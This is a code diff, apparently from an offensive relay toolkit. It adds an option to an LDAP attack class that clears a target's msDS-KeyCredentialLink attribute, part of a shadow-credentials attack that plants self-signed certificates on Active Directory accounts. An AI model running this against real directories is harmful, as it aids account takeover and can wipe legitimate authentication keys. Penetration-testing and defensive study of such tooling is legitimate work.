@@ -283,6 +283,22 @@ class LDAPAttack(ProtocolAttack):
             target_dn = result[0]
             LOG.info("Target user found: %s" % target_dn)
 
+        # Clear shadow credentials
+        if self.config.ShadowCredentialsClear:
+            LOG.info("Clearing msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+            if self.client.result['result'] == 0:
+                LOG.info("Cleared the msDS-KeyCredentialLink attribute of the target object")
+            else:
+                if self.client.result['result'] == 50:
+                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+                elif self.client.result['result'] == 19:
+                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+                else:
+                    LOG.error('The server returned an error: %s' % self.client.result['message'])
+            delegatePerformed.append(currentShadowCredentialsTarget)
+            return
+
         LOG.info("Generating certificate")
         key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget)
         LOG.info("Certificate generated")
